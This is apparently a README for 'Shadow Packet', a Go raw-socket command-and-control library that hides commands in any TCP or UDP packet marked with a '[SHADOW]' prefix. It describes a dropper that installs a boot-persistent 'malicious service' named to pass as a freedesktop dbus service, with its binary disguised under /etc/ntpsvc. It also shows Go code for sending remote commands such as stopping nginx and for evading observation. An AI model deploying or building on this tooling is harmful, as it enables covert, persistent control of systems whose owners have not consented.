# Shadow Packet
Super basic raw sockets implementation with BPF filtering. By default, supports only one way communication, but two way communication can be implemented easily with an abstraction layer.


### What is Shadow
Shadow allows a client to listen to incoming traffic on the outward facing interface for any packets (TCP or UDP) not sent by the host, with the prefix `[SHADOW]` in the data section. The port, destination address, source address, etc, does not matter. Any data following the prefix will be returned as data in the shadow packet (see below).

### How to use shadow example C2
The dropper script install.sh will create a malicious service called `dbus-org.freedesktop.isolate1.service` that begins immediately and starts on boot. The binary is located at `/etc/ntpsvc/timesync.d`. The uninstall.sh script can be used to remove from a system.

### Go Examples
**Sending a packet**
Sending packets is very easy. A lot of it is abstracted as it is meant to serve as a means of communication for other C2s, rather than being an intricate process in and of itself.

Any packets sent will be constructed from L2 and up. They will be recieved by a raw socket reading for a prefix attached automatically.

Importantly, the final parameter, the payload, will be sent exactly as written to clients.

```go
SocketFile := shadow.CreateSendSocket()
ClientIpAddr, _, _ := net.ParseCIDR("192.168.1.15")

shadow.Send(SocketFile, ClientIpAddr, "TCP", "SSH", "systemctl stop nginx")
```

If you pass in a blank string `""` to the L7 protocol, it will randomize the port number it attempts to use.

**Recieving packets**

Recieving packets is even easier than sending them. The Listen function returns a channel that has packets from either TCP or UDP.

You can also close the sockets if you would like (For example, to time with execution cycles and be less observable) by controlling the context to a done channel built into the listen functions.

```go
packetChannel := shadow.Listen(context.Background())

for packet := range packetChannel {
    if len(packet.GetPayload()) > 0 {
        ...
    }
}
```

This wil return of the type [Shadow Packet](shadow/shadow_packet.go) which has a number of accessor functions for information you want.
```go
type ShadowPacket struct {
	// Source data
	sourceAddr []byte
	sourceMac  []byte

	// Destination data
	destAddr []byte
	destMac  []byte

	// Transaction
	proto string
	data  []byte
}
```
